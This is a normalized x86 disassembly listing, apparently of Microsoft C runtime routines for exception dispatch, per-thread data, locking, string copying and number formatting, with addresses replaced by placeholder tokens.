mov ecx [ edi + 0x4 ]
cmp eax ecx
je r-xdata
test [ edi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_4b8110
test eax eax
pop ecx
pop ecx
jne r-xdata
mov eax [ esp + 0x4 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
test [ esi ] 0x2
jne r-xdata
sub_4b7382
push 0x10
push r--data
call sub_4b8944
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
call sub_4b7c13
add eax 0x80
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
call sub_4b7435
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebx + 0x8 ] esi
call sub_4b897f
retn
call sub_4b7bb5
call sub_4b7bb5
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_4b7e60
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4b7450
push 0x8
push r--data
call sub_4b8944
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_4b897f
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_4b5c3c
or [ ebp - 0x4 ] 0xffffffff
sub_4b7495
mov edx [ ecx + 0x4 ]
push esi
mov esi eax
mov eax [ ecx ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_4b74b2
push 0x40
push r--data
call sub_4b8944
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x20 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_4b5dda
pop ecx
pop ecx
mov [ ebp - 0x30 ] eax
call sub_4b7c13
mov eax [ eax + 0x78 ]
mov [ ebp - 0x34 ] eax
call sub_4b7c13
mov eax [ eax + 0x7c ]
mov [ ebp - 0x38 ] eax
call sub_4b7c13
mov [ eax + 0x78 ] esi
call sub_4b7c13
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x7c ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_4b5e6f
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4b75f5
mov eax [ ebp - 0x1c ]
call sub_4b897f
retn
sub_4b7537
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov [ ebp - 0x40 ] 0x0
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x1c ] 0x0
mov [ ebp - 0x40 ] 0x1
je r-xdata
mov eax [ ebp - 0x40 ]
retn
sub_4b757a
mov esp [ ebp - 0x18 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ecx + 0x8 ]
mov [ ebp - 0x44 ] eax
mov edi [ ebp + 0xc ]
mov eax [ edi + 0x8 ]
mov [ ebp - 0x48 ] eax
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x4c ] edx
xor edx edx
push eax
push ecx
xor esi esi
push esi
push edi
call sub_4b7382
add esp 0x10
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
mov esi [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
call sub_4b75f5
mov eax [ ebp - 0x1c ]
call sub_4b897f
retn
lea esi [ edx + edx * 4 ]
mov ebx [ ebp - 0x4c ]
lea esi [ ebx + esi * 4 ]
mov ebx [ esi + 0x4 ]
cmp eax ebx
jle r-xdata
inc edx
jmp r-xdata
cmp eax [ esi + 0x8 ]
jg r-xdata
mov [ ebp - 0x50 ] edx
cmp edx [ ecx + 0xc ]
jae r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp - 0x48 ] eax
mov edx [ ebp - 0x44 ]
mov eax [ edx + eax * 8 ]
mov [ ebp - 0x48 ] eax
sub_4b75f5
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x30 ]
call sub_4b5e23
pop ecx
call sub_4b7c13
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x78 ] ecx
call sub_4b7c13
mov ecx [ ebp - 0x38 ]
mov [ eax + 0x7c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ esi + 0x18 ]
call sub_4b5e02
pop ecx
test eax eax
je r-xdata
call sub_4b601a
push eax
push esi
call sub_4b7450
pop ecx
pop ecx
sub_4b7659
push 0x8
push r--data
call sub_4b8944
mov esi ecx
mov eax [ ebp + 0xc ]
mov edi edx
mov ebx [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
call sub_4b897f
retn
cmp [ ecx + 0x8 ] 0x0
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ eax ]
test eax eax
js r-xdata
test [ eax + 0x3 ] 0x80
je r-xdata
and [ ebp - 0x4 ] 0x0
push 0x1
push [ ebx + 0x18 ]
test al 0x8
je r-xdata
lea edi [ ecx + edi + 0xc ]
test [ esi ] 0x1
je r-xdata
call sub_4bac36
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
jne r-xdata
call sub_4bac36
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4b7bb5
push 0x1
push edi
call sub_4bac52
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4bac36
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4bac36
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_4bac52
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ edi ] eax
push 0x1
push edi
call sub_4bac52
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_4bac52
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_4b5890
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_4bac6e
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
lea ecx [ esi + 0x8 ]
mov eax [ ebx + 0x18 ]
call sub_4b7495
push eax
push edi
call sub_4b5890
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
lea ecx [ esi + 0x8 ]
test [ esi ] 0x4
je r-xdata
jmp r-xdata
call sub_4b7495
push eax
push [ esi + 0x18 ]
push edi
call sub_4b5c3c
jmp r-xdata
push 0x1
call sub_4b7495
push eax
push [ esi + 0x18 ]
push edi
call sub_4b5c3c
jmp r-xdata
lea ecx [ esi + 0x8 ]
call sub_4b7495
mov [ edi ] eax
jmp r-xdata
sub_4b77d5
push ebp
mov ebp esp
test ecx ecx
je r-xdata
cmp [ ebp + 0x1c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push ebx
push [ ebp + 0x8 ]
mov edx esi
call sub_4b7659
pop ecx
pop ecx
push [ ebp + 0x1c ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_4b5c0c
call sub_4b5c43
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_4b7382
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x18 ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4b74b2
add esp 0x28
test eax eax
je r-xdata
sub_4b783c
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
call sub_4b7c13
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov esi [ ebp + 0x1c ]
push edi
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4b5d60
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4b5ec0
add esp 0x1c
test eax eax
jne r-xdata
pop edi
push ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0xc ]
push 0x1
push [ ebp + 0x24 ]
lea ebx [ eax - 0x10 ]
push [ ebp + 0x20 ]
xor ecx ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4b77d5
mov esi [ ebp + 0x1c ]
add esp 0x1c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_4b78fc
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
and [ ebp - 0x1c ] 0x0
cmp eax 0xffffffff
mov [ ebp - 0x18 ] eax
jl r-xdata
call sub_4b7bb5
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0xe06d7363
push esi
push edi
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ ebx + 0x10 ] 0x3
mov edi 0x19930520
jne r-xdata
jmp sub_4b7b80
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x18 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4b783c
add esp 0x20
jmp r-xdata
cmp [ ebx ] 0xe06d7363
jne r-xdata
cmp [ ebx + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
cmp [ ebx + 0x14 ] edi
jne r-xdata
call sub_4b7c13
cmp [ eax + 0x78 ] 0x0
je r-xdata
mov esi [ ebp - 0x18 ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4b5d60
mov ecx [ ebp - 0x8 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
jae r-xdata
call sub_4b7c13
mov esi [ eax + 0x78 ]
mov [ ebp + 0x8 ] esi
call sub_4b7c13
mov eax [ eax + 0x7c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x1c ] 0x1
call sub_4bac36
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
jmp r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_4b7bb5
push 0x1
push ebx
call sub_4b7450
pop ecx
pop ecx
cmp [ eax ] esi
jg r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
inc [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
add eax 0x14
cmp ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp esi [ eax + 0x4 ]
jg r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ eax + 0x14 ] edi
jne r-xdata
mov esi [ ebp - 0x18 ]
mov ecx [ eax + 0xc ]
test ecx ecx
mov esi [ eax + 0x10 ]
mov [ ebp - 0x14 ] ecx
jle r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebx + 0x1c ]
mov ecx [ ecx + 0xc ]
lea edx [ ecx + 0x4 ]
mov ecx [ ecx ]
test ecx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] ecx
jle r-xdata
call sub_4b7bb5
dec [ ebp - 0x14 ]
add esi 0x10
cmp [ ebp - 0x14 ] 0x0
jg r-xdata
mov eax [ ebp - 0xc ]
mov edi [ eax ]
push [ ebx + 0x1c ]
mov [ ebp - 0x24 ] edi
call sub_4b7315
test eax eax
pop ecx
jne r-xdata
jmp r-xdata
push [ ebp - 0x1c ]
mov edi [ ebp - 0x4 ]
push [ ebp + 0x24 ]
mov ecx [ ebp - 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push ebx
mov ebx esi
mov esi [ ebp + 0xc ]
call sub_4b77d5
mov ebx [ ebp + 0x8 ]
add esp 0x1c
mov eax edi
dec [ ebp - 0x10 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x10 ] eax
jg r-xdata
mov eax [ ebp - 0x4 ]
sub_4b7ade
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
mov eax [ esi ]
push edi
and eax 0x1fffffff
mov edi 0x19930520
cmp eax edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_4b7bb5
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor eax eax
inc eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4b78fc
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4b7382
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_4b7b80
push 0x8
push r--data
call sub_4b8944
call sub_4b7c13
cmp [ eax + 0x6c ] 0x0
je r-xdata
jmp r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4b7c13
call [ eax + 0x6c ]
jmp r-xdata
push 0xa
call sub_4ba3a0
push 0x16
call sub_4bc919
pop ecx
pop ecx
push 0x3
call sub_4b87b1
int3
or [ ebp - 0x4 ] 0xffffffff
sub_4b7c13
push ebx
push esi
call [ GetLastError@IAT ]
push [ rw-data ]
mov ebx eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push ebx
call [ SetLastError@IAT ]
mov eax esi
pop esi
pop ebx
retn
push 0x88
push 0x1
call sub_4b6bc4
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push 0x10
call sub_4b6c7f
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x54 ] rw-data
mov [ esi + 0x14 ] 0x1
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4b7c84
push 0x10
push r--data
call sub_4b8944
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
call sub_4b897f
retn
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call [ TlsGetValue@IAT ]
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_4b66ed
pop ecx
push 0x0
push [ rw-data ]
call [ TlsSetValue@IAT ]
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_4b66ed
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_4b66ed
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_4b66ed
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_4b66ed
pop ecx
mov eax [ esi + 0x54 ]
cmp eax rw-data
je r-xdata
push eax
call sub_4b66ed
pop ecx
push 0xd
call sub_4b80da
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x60 ]
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push eax
call sub_4b66ed
pop ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_4b7dda
push 0xc
call sub_4b80da
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x64 ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
dec [ eax ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4b7de6
push esi
call sub_4b66ed
pop ecx
dec [ eax ]
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
cmp eax [ rw-data ]
je r-xdata
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
dec [ ecx ]
push eax
call sub_4b66ed
pop ecx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
dec [ ecx ]
mov ecx [ eax + 0x40 ]
test ecx ecx
je r-xdata
dec [ ecx ]
mov ecx [ eax + 0x4c ]
dec [ ecx + 0xb4 ]
cmp eax [ rw-data ]
je r-xdata
dec [ ecx ]
cmp eax rw-data
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_4ba179
pop ecx
sub_4b7def
call sub_4b7fa8
test eax eax
je r-xdata
call sub_4b7be2
xor eax eax
retn
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push esi
push 0x88
push 0x1
call sub_4b6bc4
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
call sub_4b7be2
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x54 ] rw-data
mov [ esi + 0x14 ] 0x1
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_4b7e60
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_4b603d
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_4b603d
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_4b7eb0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4b7ec0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4b7fa8
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_4bb19c
test eax eax
pop ecx
pop ecx
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_4b7ff1
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_4b66ed
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_4b805b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] 0x0
je r-xdata
push edi
push 0x18
call sub_4b66db
mov edi eax
test edi edi
pop ecx
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
push 0xa
call sub_4b80da
cmp [ esi ] 0x0
pop ecx
jne r-xdata
call sub_4b8990
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
push edi
call sub_4b66ed
pop ecx
push 0xfa0
push edi
call sub_4bb19c
test eax eax
pop ecx
pop ecx
jne r-xdata
pop edi
mov [ esi ] edi
jmp r-xdata
push edi
call sub_4b66ed
push 0xa
call sub_4b8046
pop ecx
pop ecx
jmp r-xdata
push 0xa
call sub_4b8046
xor eax eax
pop ecx
inc eax
sub_4b80da
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_4b805b
test eax eax
pop ecx
jne r-xdata
push 0x11
call sub_4b6c7f
pop ecx
sub_4b8110
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_4b8198
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_4bb329
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movsx eax [ esi ]
push eax
call sub_4bb227
test eax eax
mov al [ esi ]
mov cl [ rw-data ]
mov [ esi ] cl
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
sub_4b81d4
mov eax [ esp + 0x4 ]
push ebx
mov bl [ rw-data ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
inc eax
pop ebx
retn
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] bl
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
test cl cl
mov [ eax ] cl
jne r-xdata
dec eax
sub_4b8239
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_4bb6b2
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_4bb66f
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_4b8277
test edi edi
push esi
mov esi eax
je r-xdata
pop esi
retn
push esi
call sub_4b6ec0
inc eax
push eax
push esi
add esi edi
push esi
call sub_4b5890
add esp 0x10
sub_4b8294
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push esi
mov esi eax
je r-xdata
cmp [ esi ] 0x2d
mov eax ebx
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
push edi
setg al
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_4b8277
pop edi
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea eax [ ebx + 0x1 ]
xor ecx ecx
cmp [ ebp + 0x10 ] cl
push r--data
sete cl
add ecx eax
add ecx [ ebp + 0x8 ]
push ecx
call sub_4b7eb0
cmp [ ebp + 0xc ] 0x0
pop ecx
pop ecx
mov ecx eax
je r-xdata
lea ecx [ eax + 0x1 ]
mov dl [ ecx ]
mov [ eax ] dl
mov eax ecx
mov cl [ rw-data ]
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax ebx
pop esi
pop ebp
retn
mov eax [ esi + 0x4 ]
dec eax
jns r-xdata
inc ecx
cmp eax 0x64
jl r-xdata
